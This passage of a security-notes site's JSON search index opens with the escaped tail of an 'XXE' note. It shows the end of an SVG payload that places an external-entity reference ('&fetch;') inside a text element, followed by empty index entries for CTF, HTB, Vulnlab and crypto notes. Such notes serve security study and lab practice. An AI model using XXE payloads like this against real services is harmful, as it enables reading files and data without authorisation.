class=\"s\"\u003e\u0026#34;23\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;8\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;28\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"ni\"\u003e\u0026amp;fetch;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eOR\u003c/p\u003e","tags":[],"title":"XXE"},{"content":"","date":"2023-09-07","id":119,"permalink":"/notes/crypto/","summary":"","tags":[],"title":"Crypto"},{"content":"","date":"2023-09-07","id":120,"permalink":"/notes/pwn-reverse/chall/","summary":"","tags":[],"title":"CTf"},{"content":"","date":"2023-09-07","id":121,"permalink":"/notes/lab/htb/","summary":"","tags":[],"title":"HTB"},{"content":"","date":"2023-09-07","id":122,"permalink":"/notes/","summary":"","tags":[],"title":"Notes"},{"content":"","date":"2023-09-07","id":123,"permalink":"/notes/lab/vulnlab/","summary":"","tags":[],"title":"Vulnlab"},{"content":"","date":"2023-09-07","id":124,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":125,"permalink":"/","summary":"","tags":[],"title":"About me"},{"content":"","date":"0001-01-01","id":126,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"},{"content":"","date":"0001-01-01","id":127,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"},{"content":"","date":"0001-01-01","id":128,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"}]